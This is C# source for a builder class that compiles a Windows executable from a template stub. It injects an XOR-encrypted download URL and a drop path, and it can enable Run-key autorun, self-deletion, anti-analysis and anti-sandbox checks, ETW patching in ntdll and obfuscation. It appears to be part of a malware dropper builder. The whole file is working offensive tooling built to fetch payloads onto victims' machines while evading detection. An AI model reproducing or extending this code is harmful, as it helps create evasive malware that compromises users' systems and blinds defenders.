using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Text;

namespace XBuilder.XCode
{
    internal class BuildEngine
    {
        public static bool Compilate(string UrlApp, string AppName, string DropPath, string OutPath, bool Autorun, bool SelfDelete, bool AntiAnalyse, bool AntiAnyRun, bool MutexControl, string MutexValue, bool Obfuscate, bool UsePatchEtw, bool UseProtectFunctions)
        {
            string XorKey = EncryptEngine.GenerateRandomXorKey(EncryptEngine.GenerateRandomInt());

            string csharpcode = Properties.Resources.stub
                .Replace("%EncryptedUrl%", EncryptEngine.StringEncryptor(UrlApp, XorKey))
                .Replace("%PathToDrop%", DropPath)
                .Replace("%EncryptedFileName%", EncryptEngine.StringEncryptor(AppName, XorKey))
                .Replace("%Xor_Key%", XorKey);

            CompilerParameters parameters = new CompilerParameters
            {
                GenerateExecutable = true,
                OutputAssembly = OutPath,
                CompilerOptions = "/target:winexe /platform:x86",
                IncludeDebugInformation = false
            };

            if (UseProtectFunctions)
            {
                parameters.CompilerOptions += " /define:Protect_Functions";

                if (Autorun)
                {
                    parameters.CompilerOptions += " /define:Autorun";
                    csharpcode = csharpcode
                        .Replace("%REG_AUTOSTART_KEY%", EncryptEngine.StringEncryptor("Software\\Microsoft\\Windows\\CurrentVersion\\Run", XorKey));
                }

                if (SelfDelete)
                {
                    parameters.CompilerOptions += " /define:SelfDelete";
                }

                if (AntiAnalyse)
                {
                    parameters.CompilerOptions += " /define:AntiAnalysis";
                }

                if (AntiAnyRun)
                {
                    parameters.CompilerOptions += " /define:AntiAnyRun";
                }

                if (MutexControl)
                {
                    parameters.CompilerOptions += " /define:MutexControl";
                    csharpcode = csharpcode.Replace("%MutexValue%", MutexValue);
                }

                if (UsePatchEtw)
                {
                    parameters.CompilerOptions += " /define:ETW_PATCHER";
                    csharpcode = csharpcode
                    .Replace("%ntdll_lib%", Convert.ToBase64String(Encoding.UTF8.GetBytes("ntdll.dll")))
                    .Replace("%etwtrace%", Convert.ToBase64String(Encoding.UTF8.GetBytes("EtwEventWrite")));
                }
            }

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Management.dll");
            parameters.ReferencedAssemblies.Add("System.Linq.dll");
            parameters.ReferencedAssemblies.Add("System.Core.dll");

            using (CSharpCodeProvider codeProvider = new CSharpCodeProvider())
            {
                CompilerResults results = codeProvider.CompileAssemblyFromSource(parameters, csharpcode);

                if (results.Errors.Count > 0)
                {
                    using (StreamWriter writer = new StreamWriter("compilation_errors.txt", true))
                    {
                        foreach (CompilerError error in results.Errors)
                        {
                            writer.WriteLine($"Error: {error.ErrorText} in {error.FileName} at {error.Line}:{error.Column}");
                        }
                    }
                    throw new InvalidOperationException("Failed to compile the stub. Check compilation_errors.txt for details.");
                }

                if (Obfuscate)
                {
                    Random random = new Random();
                    ObfuscateEngine.PerformObfuscation(OutPath, random.Next(100, 200), random.Next(30, 60));
                }
            }
            return true;
        }
    }
}
